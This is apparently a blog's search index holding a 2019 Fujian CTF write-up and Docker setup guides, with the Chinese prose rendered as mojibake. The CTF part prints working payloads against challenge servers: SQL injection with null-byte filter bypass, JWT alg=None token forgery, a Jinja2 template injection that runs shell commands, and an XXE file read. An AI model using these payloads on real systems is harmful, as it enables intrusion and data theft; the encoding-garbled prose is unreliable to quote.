<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2019 ç¦å»ºçœç½‘ç»œå®‰å…¨å®£ä¼ å‘¨é»‘ç›¾æ¯Writeup]]></title>
    <url>%2F2019%2F09%2F16%2F2019-%E7%A6%8F%E5%BB%BA%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E5%91%A8%E9%BB%91%E7%9B%BE%E6%9D%AFWriteup%2F</url>
    <content type="text"><![CDATA[å‰è¨€å¤§ä¸‰æŽ¥æ£’å†²åˆº,è¿™ä¸€æˆ˜æ— ç–‘éœ€è¦å–å¾—å¥½çš„æˆç»©ï¼Œä¸ºåŽè¾ˆæ ‘ç«‹æ¦œæ ·ï¼ä¸è¿‡ç¦å»ºçœâ€é»‘ç›¾æ¯â€å¤§å¤šéƒ½æ˜¯åŸºç¡€å…¥é—¨é¢˜,å°±ç®—èµ¢äº†,ä¹Ÿä¸èƒ½å¤ªå¾—æ„XD è·¯è¿˜é•¿~ä»»é‡è€Œé“è¿œå‘,è¿™é‡Œå°±æŒ‘å‡ é¢˜è‡ªå·±åšè¿‡çš„é¢˜ç›®è®²ä¸‹,miscå¤ªåŸºç¡€å°±ä¸å¤šè¯´äº†,binä¹Ÿä¸è¯´äº†ï¼Œå®³ï¼Œä»Šå¹´ä¾æ—§æ˜¯ä¸ä¼šå†™pwnçš„èœèœ ç®€å•ä»‹ç»ä¸‹â€é»‘ç›¾æ¯â€èµ›åˆ¶,æ¯”èµ›æ—¶é•¿6å°æ—¶,ä¸ŠåŠåœºæ ‡å‡†çš„å¤ºæ——èµ›,ä½†æ²¡æœ‰ä¸€è¡€å¥–åŠ±æœºåˆ¶,ä¸‹åŠåœºä¼ä¸šæ¸—é€,æœ€åŽç†è®ºçŸ¥è¯†ç«žèµ›ç»“å°¾(ç­‰ä¿é—®é¢˜) Reguess the keyç¨‹åºæä¾›äº†åŠ å¯†æ–¹å¼ï¼Œå’Œä¸€å¯¹æ˜Žæ–‡å¯†æ–‡ å…ˆé€†å‘åŠ å¯†ç®—æ³•,å†™å‡ºç ´è§£keyçš„è„šæœ¬,å†çŒœæµ‹å¦ä¸€ä»½å¯†æ–‡å¯èƒ½ä½¿ç”¨çš„Keyå³å¯ payload 12345678910111213141516171819202122232425262728293031plain_text = open('msg01','r').read().strip()cipher_text = open('msg01.enc','r').read().strip()cipher2_text = open('msg02.enc','r').read().strip()plain_text = [ord(i) for i in plain_text]cipher_text = [ord(i) for i in cipher_text]cipher2_text = [ord(i) for i in cipher2_text]t = 0f = 0key = ''plain = ''for i in range(len(plain_text)): c = ((cipher_text[i] - (i*i) - plain_text[i]) ^ t) &amp; 0xff key += chr(c) t = plain_text[i]key = key[0:31]print key//VeryVeryLongKeyYouWillNeverKnowVerykey = [ord(i) for i in key]for i in range(len(cipher2_text)): c = (cipher2_text[i] - (key[i % len(key)] ^ f) - i*i) &amp; 0xff plain += chr(c) f = cprint plain//She had been shopping with her Mom in Wal-Mart. She must have been 6 years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much in a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;101a6ec9f938885df0a44f20458d2eb4&#125; Webi have the_flagé¡µé¢jsä¸€å †æ²¡ç”¨çš„å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ªckå‡½æ•°æœ‰ç”¨ 12345678910111213141516function ck(s) &#123; try &#123; ic &#125; catch (e) &#123; return; &#125; var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54]; if (s.length == a.length) &#123; for (i = 0; i &lt; s.length; i++) &#123; if (a[i] - s.charCodeAt(i) != 3) return ic = false; &#125; return ic = true; &#125; return ic = false;&#125; å¾ˆæ˜¾ç„¶è§£å‡ºè¿™ä¸²Asciiå€¼æ‹¿åŽ»æäº¤å°±å¯ä»¥æˆåŠŸgetflag 123456789101112I have the FlagType in something to get the flag.Tips: Maybe you have the flag.Something: simpleedu123Congratulations!!muWn9NU0H6erBN/w+C7HVg a little hard123456789101112131415161718192021&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER["HTTP_CLIENT_IP"])) $cip = $_SERVER["HTTP_CLIENT_IP"];else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];else if(!empty($_SERVER["REMOTE_ADDR"])) $cip = $_SERVER["REMOTE_ADDR"];else $cip = "0.0.0.0";return $cip;&#125;$GetIPs = GetIP();if ($GetIPs=="1.1.1.1")&#123;echo "Great! Key is *********";&#125;else&#123;echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½IPï¿½ï¿½ï¿½Ú·ï¿½ï¿½ï¿½ï¿½Ð±ï¿½Ö®ï¿½Ú£ï¿½";&#125;?&gt; é¢˜ç›®ç›´æŽ¥ç»™äº†æºç ï¼Œé˜…è¯»æºç å¯çŸ¥å¯é€šè¿‡ä¼ªé€ XFFå¤´ä»¤å˜é‡$GetsIPå€¼ä¸º1.1.1.1ï¼Œæž„é€ è¯·æ±‚å¤´å³å¯å¾—åˆ°flag 1234GET /hard/ HTTP/1.1Host: 202.0.0.37x-forwarded-for: 1.1.1.1Connection: close click_1è¿™é¢˜å°±å¤ªç®€å•äº† æŸ¥çœ‹æºç ç³»åˆ— 1&lt;div id="esc" style="position:absolute;"&gt;&lt;input type="button" onfocus="nokp();" onclick="window.location='?key=700c';" value="click me!"&gt;&lt;/div&gt;&lt;input type="text" readonly style="width:350;" id="hint" value="do you want to join? catch button, if you can!"&gt; æ³¨æ„åˆ°?key=700cï¼ŒäºŽæ˜¯æž„é€ URLè®¿é—®http://202.0.0.37/click/?key=700cå³å¯å¾—åˆ°flag èŠ±å¼è¿‡waf2018é»‘ç›¾æ¯åŽŸé¢˜ï¼Œä½¿ç”¨å·¥å…·æ‰«æåŽå‘çŽ°æœ‰www.zipï¼Œä¸‹è½½æºç å¼€å§‹ä»£ç å®¡è®¡ function.php: eregi å¯ä»¥ä½¿ç”¨ %00æˆªæ–­æ­£åˆ™ 123456789function filtering($str) &#123; $check= eregi('select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile', $str); if($check) &#123; echo "éžæ³•å­—ç¬¦!"; exit(); &#125; .....&#125; content.php: é‡Œé¢ç›´æŽ¥æ‹¼æŽ¥ç»™çš„å‚æ•° 12345&lt;?phpinclude './global.php';extract($_REQUEST);$sql = "select * from test.content where id=$message_id"; æž„é€ è¯·æ±‚å¾—åˆ°flagã€‚ 1message_id="%00" union select 1,2,flag,4 from flag å¿˜è®°å¯†ç äº†é¢˜ç›®ä¸€å¼€å§‹åªæœ‰ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œè¦æ±‚å¡«å…¥emailï¼Œéšä¾¿å¡«ä¸€ä¸ªåŽæœ‰alertæç¤ºå‰å¾€`/forget/step2.php?email=youremail@address.com&amp;check=?????`è¿›è¡Œä¸‹ä¸€æ­¥ å‘çŽ°ç½‘é¡µæºä»£ç ä¸­æœ‰é‡è¦ä¿¡æ¯ï¼š 12&lt;meta name="admin" content="admin@simplexue.com" /&gt;&lt;meta name="editor" content="Vim" /&gt; å¹¶ä¸”step2.phpä¸­å«æœ‰ä¸€ä¸ªæäº¤åˆ°submit.phpçš„è¡¨å•ï¼Œæœ‰emailAddresså­—æ®µå’Œtokenå­—æ®µ çœ‹åˆ°Vimå¯ä»¥æƒ³åˆ°Vimç¼–è¾‘å™¨åœ¨éžæ­£å¸¸é€€å‡ºçš„æƒ…å†µä¸‹ä¼šç•™ä¸‹.swpæ–‡ä»¶ï¼Œç»è¿‡é€ä¸ªæµ‹è¯•å‘çŽ°äº†submit.phpçš„æºç  1forget/.submit.php.swp 123456789101112131415161718192021222324252627282930313233343536373839404142........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ......../*å¦‚æžœç™»å½•é‚®ç®±åœ°å€ä¸æ˜¯ç®¡ç†å‘˜åˆ™ die()æ•°æ®åº“ç»“æž„---- è¡¨çš„ç»“æž„ `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- è½¬å­˜è¡¨ä¸­çš„æ•°æ® `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, '****ä¸å¯è§***', '***ä¸å¯è§***', 0);*/........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "å¤±è´¥äº†å‘€"; &#125;&#125; æŒ‰ç…§ä»£ç æž„é€ tokenï¼Œå¾—åˆ°flag 1GET /forget/setp2.php?emailAddress=admin@simplexue.com&amp;token=0000000000 pyä¸€æ³¢å§-ssti+jwt_1JWT alg=None ç­¾åbypassæ”»å‡» -&gt; SSTIï¼Œå¼ºè¡ŒæŠŠä¸¤é“é¢˜æ‹¼æˆä¸€é“é¢˜ï¼Œæ²¡æœ‰ç¬¬ä¸€æ­¥ä¸èƒ½è¿›å…¥SSTI 12345éšä¾¿è¾“å…¥ä¸€ä¸ªç”¨æˆ·åå¯†ç ï¼Œå°†cookieé‡Œé¢çš„tokenæå–å‡ºæ¥ï¼Œè§£base64å¯å¾—```&#123;"alg":"HS256","typ":"JWT"&#125;.&#123;"username":"admin1"&#125;.signature``` å¯ä»¥ç”Ÿæˆä¸€ä¸ªç”¨æˆ·åä¸ºadminçš„token 12345678910111213141516#encoding: utf-8 #PyJWTimport jwt import time def create_token(): payload = &#123; "username": "admin" &#125; token = jwt.encode(payload, None, algorithm=None) print token create_token() æŠŠtokenæ¢ä¸ŠåŽ»ï¼Œå°±å¯ä»¥è¿›å…¥SSTIæµç¨‹äº†ã€‚ SSTIè¿‡æ»¤äº†ï¼šå•å¼•å·ã€osã€systemã€[] Jinja2å¯¹ä¸Žä¸å­˜åœ¨çš„å¯¹è±¡æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å®šä¹‰Undefinedç±»ï¼Œ&lt;class &#39;jinja2.runtime.Undefined&#39;&gt; jinja2/runtime.py 123@implements_to_stringclass Undefined(object): ... é€šè¿‡æž„é€ title=å°±å¯ä»¥æžäº‹æƒ…äº†ï¼Œå‘çŽ°æœ‰ä¸ªevalï¼Œå°±æ˜¯å®ƒäº†ã€‚ 1&#123;'new_context': &lt;function new_context at 0x7fc79bb4faa0&gt;, 'chain': &lt;type 'itertools.chain'&gt;, '_context_function_types': (&lt;type 'function'&gt;, &lt;type 'instancemethod'&gt;), 'resolve_or_missing': &lt;function resolve_or_missing at 0x7fc79bb4fcf8&gt;, 'Namespace': &lt;class 'jinja2.utils.Namespace'&gt;, 'ContextMeta': &lt;class 'jinja2.runtime.ContextMeta'&gt;, 'evalcontextfunction': &lt;function evalcontextfunction at 0x7fc79bd919b0&gt;, 'escape': &lt;built-in function escape&gt;, 'LoopContext': &lt;class 'jinja2.runtime.LoopContext'&gt;, '_first_iteration': &lt;object object at 0x7fc79f5b2190&gt;, 'TemplateNotFound': &lt;class 'jinja2.exceptions.TemplateNotFound'&gt;,Â·Â·Â·'eval': &lt;built-in function eval&gt; ä¸èƒ½ç”¨[]å¯ä»¥ä½¿ç”¨.get()ç»•è¿‡ï¼Œè¢«è¿‡æ»¤çš„å­—ç¬¦ä¸²å¯ä»¥æ‹†åˆ†æˆ2ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚ 1&#123;&#123;vvv.__class__.__init__.__globals__.get("__bui"+"ltins__").get("e"+"val")("__imp"+"ort__(\"o"+"s\").po"+"pen(\"ls\").read()")&#125;&#125; æ‰§è¡Œå‘½ä»¤åˆ—ç›®å½•ï¼Œå‘çŽ°æ²¡æœ‰ä¼ è¯´ä¸­çš„flagï¼Œä½†æ˜¯å‘çŽ°äº†ä¸€ä¸ªä»¥æ•°å­—+è‹±æ–‡ç»„åˆä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œç»è¿‡ç¡®è®¤ï¼Œå°±æ˜¯flag 1&#123;&#123;vvv.__class__.__init__.__globals__.get("__bui"+"ltins__").get("e"+"val")("__imp"+"ort__(\"o"+"s\").po"+"pen(\"cat f41321d3b61338c8d239e75d971f34a4\").read()")&#125;&#125; æœ¬é¢˜æºç åœ¨/app/noneè·¯å¾„ä¸‹ï¼Œä¹Ÿå¯é€šè¿‡æž„é€ ç±»ä¼¼å‘½ä»¤è¿›è¡Œè¯»å–ã€‚ harduploadåœ¨ä»Šå¹´çš„Google CTF ä¸­å‡ºäº†ä¸€é“Blind XXE é¢˜ bnvï¼Œå¯ä»¥åšå‚è€ƒ ä¸æ‡‚xxeå»ºè®®å…ˆäº†è§£ä¸€æ³¢ https://www.cnblogs.com/backlion/p/9302528.html https://xz.aliyun.com/t/3357 ä¸Šä¼ phpä¸€å¥è¯è¿”å›žé”™è¯¯ä¿¡æ¯ 1For Security, our system do not allow upload xml file from now on.&lt;/b&gt;&lt;/br&gt;Other file like png,jpg,rar,zip...etc is welcome&lt;/br&gt; å¯ä»¥ä¸Šä¼ å›¾ç‰‡ç­‰æ–‡ä»¶æ ¼å¼,æ°å¥½xmlå¯ä»¥è§£æžsvg payload 123456789101112&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM "file:///hhh_Th1s_y0uR_f14g"&gt; //æ ¹æ®æŠ¥é”™å›žæ˜¾æ‰¾åˆ°flagè·¯å¾„&lt;!ENTITY % para '&lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM&amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;&amp;#x25;para2;'&gt;%para;]&gt;&lt;message&gt;10&lt;/message&gt; æ³¨æ„æŒ‡å®šMIMEç±»åž‹ Content-Type: text/xml cryptoMaybeBaseYMFZZTY0D3RMD3RMMTIZ è¿™ä¸€ä¸²åˆ°åº•æ˜¯ä»€ä¹ˆï¼ï¼ï¼ï¼ä¸ºä»€ä¹ˆè¿™ä¹ˆåƒbase32å´ä¸æ˜¯ï¼ï¼ï¼æ˜Žæ–‡çš„md5å€¼ä¸º16478a151bdd41335dcd69b270f6b985 å¯ä»¥ç”¨base64ä¸åŒºåˆ†å¤§å°å†™å·¥å…·ç›´æŽ¥çˆ†å‡ºæ‰€æœ‰å¯èƒ½çš„flag 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python#coding: utf-8import base64,sys,os,redef,redef dfs(res,arr,pos): res.append(''.join(arr)) i=pos for i in range(i,len(arr)): if arr[i]&lt;='Z' and arr[i]&gt;='A': arr[i]=arr[i].lower() dfs(res,arr,i+1) arr[i]=arr[i].upper()if __name__=="__main__": print '+' + '-' * 50 + '+' print u'\t base64å¤§å°å†™è½¬æ¢è§£å¯†å·¥å…·' print '+' + '-' * 50 + '+' if len(sys.argv) != 2: print u'ç”¨æ³•ï¼š' + os.path.basename(sys.argv[0]) + u' base64å¯†æ–‡' print u'å®žä¾‹ï¼š' + os.path.basename(sys.argv[0]) + ' "AGV5IULSB3ZLVSE="' sys.exit() arr = list(sys.argv[1]) res = [] dfs(res, arr, 0) res_decode = map(base64.b64decode, res) for i in res_decode: if re.findall(r'\\x', repr(i)): continue else: print i/*base64wtfwtf123base64wtfwtL123base64wtLwtf123base64wtLwtL123baYe64wtfwtf123baYe64wtfwtL123baYe64wtLwtf123baYe64wtLwtL123*/ å¾—åˆ°base64wtfwtf123çš„md5å€¼ä¸º16478a151bdd41335dcd69b270f6b985flagå°±æ˜¯è¿™ä¸ªäº†ï¼ åˆ†äº«ä¸€ä¸ªè‡ªå­˜CTFé¢˜çš„åœ°å€,å¦‚æžœéœ€è¦è¯·åŠæ—¶è‡ªå–,åœ°å€æŒ‚äº†å‘ä¸ªé‚®ä»¶ç»™æˆ‘:) -=&gt; OneDrive cloud]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>web,Re,crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æµ…è°ˆDocker-for-Windowsä¸ŽVMwareå…±å­˜]]></title>
    <url>%2F2019%2F08%2F22%2F%E6%B5%85%E8%B0%88Docker-for-Windows%E4%B8%8EVMware%E5%85%B1%E5%AD%98%2F</url>
    <content type="text"><![CDATA[å‰è®° æœ€è¿‘ä½¿ç”¨dockeræ¯”è¾ƒå¤šï¼Œä½†æ˜¯å¶ç„¶é—´ä½¿ç”¨VMçš„æ—¶å€™é‡åˆ°äº†å…¼å®¹æ€§å†²çªé—®é¢˜ ä½¿ç”¨è¿‡VMware WorkStationçš„æœ‹å‹åº”è¯¥çŸ¥é“ï¼Œvmæ— æ³•ä¸Žhyper-vå…±å­˜ã€‚é‚£ä¹ˆå¦‚æžœæˆ‘çš„ç”µè„‘å·²ç»å®‰è£…å’Œä½¿ç”¨VMï¼Œå¦‚ä½•æ‰èƒ½ä½¿ç”¨Docker for Windowså‘¢ï¼Œå¦‚æžœè¦åŒæ—¶ä½¿ç”¨å°±åªèƒ½æ”¾å¼ƒhyper-vå•¦ Docker for Windows ä¸åŒäºŽ Docker Toolboxã€‚Docker for Windows å¯¹ç³»ç»Ÿçš„è¦æ±‚è‡³å°‘ä¸ºWindows 10ä¸“ä¸šç‰ˆï¼Œå› ä¸ºå®ƒéœ€è¦Hyper-Vçš„æ”¯æŒï¼Œè€ŒDockbox Toolboxä½¿ç”¨Oracle Virtual Boxè€Œä¸æ˜¯Hyper-V . ä½†æ˜¯æˆ‘ä¸å¸Œæœ›docker-machineä½¿ç”¨Virtual Boxï¼Œç›¸å…³é…ç½®æˆ‘æ˜¯å‚è€ƒToolboxï¼Œé“ç†æ˜¯ä¸€æ ·çš„XD å®‰è£…Docker for Windowsä¸‹è½½Docker for Windowsä»Žè¿™ä¸ªåœ°å€ä¸‹è½½å¹¶è¿›è¡Œå®‰è£…ï¼šdocker for windows å®‰è£…è¿‡ç¨‹ä¸­å¦‚æžœé‡åˆ°ç³»ç»Ÿç‰ˆæœ¬ä¸é€‚é…çš„é—®é¢˜å¯ä»¥ä¿®æ”¹EditionIDçš„å˜é‡å€¼ä¸ºProfession ï¼Œæ³¨å†Œè¡¨åœ°å€å¦‚ä¸‹ï¼š 1HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion å®‰è£…æˆåŠŸåŽä¸è¦å¯åŠ¨æœåŠ¡ å…³é—­Hyper-v1bcdedit /set hypervisorlaunchtype off ç®¡ç†å‘˜èº«ä»½è¿è¡ŒæˆåŠŸåŽé‡å¯è®¡ç®—æœº å‡†å¤‡å·¥ä½œ1ã€ä¸‹è½½æœ€æ–°ç‰ˆæœ¬boot2docker.iso ä¸‹è½½åœ°å€ https://github.com/boot2docker/boot2docker/releases ç„¶åŽå°† boot2docker.iso æ”¾åœ¨ C:\Users\&lt;ç”¨æˆ·å&gt;\.docker\machine\cache\ï¼Œæ–‡ä»¶å¤¹ä¸å­˜åœ¨å°±è‡ªå·±å»ºç«‹ 2ã€ä¸‹è½½ VMware Workstation é©±åŠ¨ ä»Žè¿™é‡Œä¸‹è½½ https://github.com/pecigonzalo/docker-machine-vmwareworkstation/releases/ æœ€æ–°ç‰ˆçš„vmé©±åŠ¨ã€‚æ­¤é©±åŠ¨éžå®˜æ–¹å¼€å‘ï¼Œä½†æ˜¯ä¹Ÿåœ¨å®˜æ–¹çš„æ–‡æ¡£ä¸­æœ‰é“¾æŽ¥ ç„¶åŽå°† docker-machine-driver-vmwareworkstation.exeå¤åˆ¶åˆ° C:\Program Files\Docker\Docker\resources\bin ä¸‹ï¼š å®‰è£…Docker MachineDocker Machine æ˜¯ Docker å®˜æ–¹æä¾›çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨è¿œç¨‹çš„æœºå™¨ä¸Šå®‰è£… Dockerï¼Œæˆ–è€…åœ¨è™šæ‹Ÿæœº host ä¸Šç›´æŽ¥å®‰è£…è™šæ‹Ÿæœºå¹¶åœ¨è™šæ‹Ÿæœºä¸­å®‰è£… Dockerã€‚æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ docker-machine å‘½ä»¤æ¥ç®¡ç†è¿™äº›è™šæ‹Ÿæœºå’Œ Dockerã€‚ä¸‹é¢æ˜¯æ¥è‡ª Docker Machine å®˜æ–¹æ–‡æ¡£çš„ä¸€å¼ å›¾ï¼Œå¾ˆå½¢è±¡å“¦ï¼ Docker Machine çš„å®‰è£…ååˆ†ç®€å•ï¼Œå¦‚æžœåœ¨è¿œç¨‹ä¸»æœºä¸­ç›´æŽ¥æŠŠå¯æ‰§è¡Œæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å°±å¯ä»¥äº†ã€‚ 123$ curl -L https://github.com/docker/machine/releases/download/v0.12.0/docker-machine-`uname -s`-`uname -m` &gt; /tmp/docker-machine$ chmod +x /tmp/docker-machine$ sudo mv /tmp/docker-machine /usr/local/bin/docker-machine å…¶ä¸­ v0.12.0 æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ã€‚å½“ç„¶ Docker Machine æ˜¯ä¸ªå¼€æºé¡¹ç›®ï¼Œä½ å¯ä»¥é€‰æ‹©å®‰è£…ä¸åŒçš„ç‰ˆæœ¬ï¼Œæˆ–è€…æ˜¯è‡ªè¡Œç¼–è¯‘ã€‚å› ä¸ºæˆ‘ä¸å¤ªéœ€è¦åœ¨è¿œç¨‹æ­å»ºdockerï¼Œæ‰€ä»¥å°±ä¸è¿‡å¤šä»‹ç»äº†XDï¼Œä¸‹é¢è¿˜æ˜¯ç»§ç»­æ­£é¢˜ 0.é‡ç½®docker-machineé»˜è®¤ä½ç½® æ·»åŠ MACHINE_STORAGE_PATHçŽ¯å¢ƒå˜é‡ï¼Œåœ°å€è®¾ä¸ºä½ å¸Œæœ›å­˜å‚¨çš„ä½ç½®ï¼Œé‡å¯ç³»ç»Ÿ å¦‚æžœä½ ä¸æƒ³å ç”¨å¤ªå¤šç³»ç»Ÿç›˜ç©ºé—´ï¼Œå»ºè®®æ”¹ä¸€ä¸‹ï¼Œå¦å¤–æœ‰å¯èƒ½é‡åˆ°sshè¯ä¹¦æ ¡éªŒé—®é¢˜ï¼Œä¸èƒ½ç¡®å®šçœŸæ­£çš„åŽŸå› ï¼Œå¦‚æžœè¿™ä¸ªæ–¹æ¡ˆä½ ä¹Ÿå¤±æ•ˆäº†ï¼Œé‚£ä¹ˆè¯·æ”¹å›žé»˜è®¤çš„åœ°å€.docker/machineç›®å½•ä¸‹ å¹¶ä¸”å»ºè®®ä½ åœ¨å®žä¾‹å®‰è£…æˆåŠŸåŽï¼Œæ›´æ”¹è™šæ‹Ÿæœºçš„å·¥ä½œæ–‡ä»¶ï¼Œä¸€æ ·å¯ä»¥è§£å†³å ç”¨ç³»ç»Ÿç©ºé—´çš„é—®é¢˜ðŸ˜Ž 1ã€æ‰“å¼€VMware Workstation è¿™ä¸€æ­¥æ˜¯å¿…é¡»çš„ï¼VMç‰ˆæœ¬å¿…é¡»å¤§äºŽ10 2ã€å®‰è£…Docker-dev æ‰“å¼€cmdï¼Œæ‰§è¡Œå‘½ä»¤ 12docker-machine create --driver=vmwareworkstation Docker-dev //docker-devå®žé™…ä¸Šæ˜¯è™šæ‹Ÿæœºçš„åç§°ï¼Œå¯è‡ªå®šä¹‰ æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ 3ã€éªŒè¯å®‰è£… 1docker-machine ls ä¼šå‡ºçŽ°çœ‹åˆ°åˆšåˆšå®‰è£…çš„docker-devå®žä¾‹ å¦‚æžœåˆ—è¡¨æœ‰ä¹‹å‰å®‰è£…å¤±è´¥æˆ–è€…æ—§çš„devï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤æ¸…é™¤ 1docker-machine rm -f &lt;NAME&gt; 4ã€æ¿€æ´»å®žä¾‹ æ‰§è¡Œå‘½ä»¤ï¼š 1docker-machine env Docker-dev ä¼šå‡ºçŽ°è¦ä½ é…ç½®çš„çŽ¯å¢ƒå˜é‡ï¼š ä¾æ¬¡æ·»åŠ çŽ¯å¢ƒå˜é‡å³å¯ 5ã€éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ ç™»å½•devå®žä¾‹ ä½¿ç”¨å‘½ä»¤ç™»å½•ï¼š 1docker-machine ssh Docker-dev å‡ºçŽ°å¦‚ä¸‹è¡¨ç¤ºæˆåŠŸï¼š æ”¶å°¾å·¥ä½œ1ã€é…ç½®åŠ é€Ÿå™¨ é€šè¿‡å‘½ä»¤ç™»å½•docker-machine æŒ‰ç…§åŠ é€ŸæœåŠ¡æä¾›å•†çš„æ•™ç¨‹æ‰§è¡Œå‘½ä»¤å³å¯ æœ¬è´¨ä¸Šå°±æ˜¯ æ–°å»ºæ–‡ä»¶ vi /etc/docker/daemon.json è¾“å…¥ä»¥ä¸‹å†…å®¹ 123&#123; "registry-mirrors": ["ä½ çš„åŠ é€Ÿå™¨åœ°å€"]&#125; ä¿å­˜é‡å¯è™šæ‹Ÿæœºå³å¯ ä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œä½ è¿˜å¯ä»¥åœ¨VMware ä¸­æ·»åŠ ä½ åˆšåˆšåˆ›å»ºçš„Docker-dev 2.sshè¿žæŽ¥æ–¹å¼ é€šå¸¸æƒ…å†µä¸‹ï¼ŒæŽ¨èä½¿ç”¨ docker-machine ssh default è¿›è¡Œç™»å½•ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚default æ˜¯é»˜è®¤çš„ machine åå­—ã€‚ åœ¨ boot2docker ä¸­ï¼Œé»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯ï¼š 12user: dockerpass: tcuser ç™»å½•æ–¹æ³•ï¼š 12345678910$ ssh docker@localhost -p 2022docker@localhost's password: tcuser ## . ## ## ## == ## ## ## ## === /""""""""""""""""\___/ === ~~~ &#123;~~ ~~~~ ~~~ ~~~~ ~~ ~ / ===- ~~~ \______ o __/ \ \ __/ \____\______/ è¿™æ ·æˆ‘å°±èƒ½å¾ˆæ–¹ä¾¿çš„ç®¡ç†docker 3ã€å…³é—­Docker Desktop æœåŠ¡ ç”±äºŽæ²¡æœ‰ä½¿ç”¨hyper-v æ‰€ä»¥æœ¬åœ°æ²¡å¿…è¦èµ·è¿™ä¸ªæœåŠ¡ï¼Œå¯ä»¥æŠŠå¼€æœºè‡ªå¯é¡¹åŽ»æŽ‰ æ¯æ¬¡ä½¿ç”¨çš„æ—¶å€™å¼€å¯è™šæ‹ŸæœºDocker-devå³å¯ ç”¨æ³•éƒ½ä¸€æ ·ï¼Œåœ¨vscodeä¸­ä¾ç„¶æ­£å¸¸è¿žæŽ¥ï¼Œåªæ˜¯åœ¨ç»ˆç«¯ä½¿ç”¨çš„æ—¶å€™è¦sshè¿žæŽ¥Docker-devè€Œå·² æžœç„¶è¿˜æ˜¯å…¥æ‰‹macæ˜¯æœ€é«˜æ•ˆçš„XD èŠ±é’±çœå¿ƒ ï¼]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>Hyper-v</tag>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dockerå…¥é—¨ä¹‹åè¡€æ€»ç»“]]></title>
    <url>%2F2019%2F08%2F22%2FDocker%E5%85%A5%E9%97%A8%E4%B9%8B%E5%90%90%E8%A1%80%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[å‰è¨€è¿›å…¥è¿™ä¸ªåœˆå­æŒºä¹…äº†ï¼Œè¿˜æ²¡ç¢°è¿‡dockerï¼Œè¶ç€æš‘å‡é—²å¾—æ…Œï¼Œæ‰“ä¸€æ³¢åŸºç¡€XD ðŸ˜„dockeræ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨CTFæ¯”èµ›ä¸­æˆ‘ä»¬å¯ä»¥ç»å¸¸é‡åˆ°é€šè¿‡dockeréƒ¨ç½²çš„webï¼Œæˆ–è€…PwnçŽ¯å¢ƒï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸€äº›æœåŠ¡éƒ¨ç½²åœ¨dockeré‡Œé¢ï¼Œç®¡ç†æ–¹ä¾¿ï¼Œå¹¶ä¸”è¾ƒä¸ºå®‰å…¨ã€‚ è´´å‡ ä¸ªå­¦ä¹ ç½‘å€ï¼šDocker Hub ã€dockerä¸­æ–‡ç¤¾åŒºã€docker dcosã€dockerä»Žå…¥é—¨åˆ°å®žè·µ(è¶…å…¨) æŽ¥ä¸‹æ¥åˆ†ä¸‰ä¸ªéƒ¨åˆ†å…¥é—¨dockerï¼šdockeræ¦‚å¿µã€dockerä½¿ç”¨ã€docker-CTFè¿ç”¨ Dockeræ¦‚å¿µ Docker 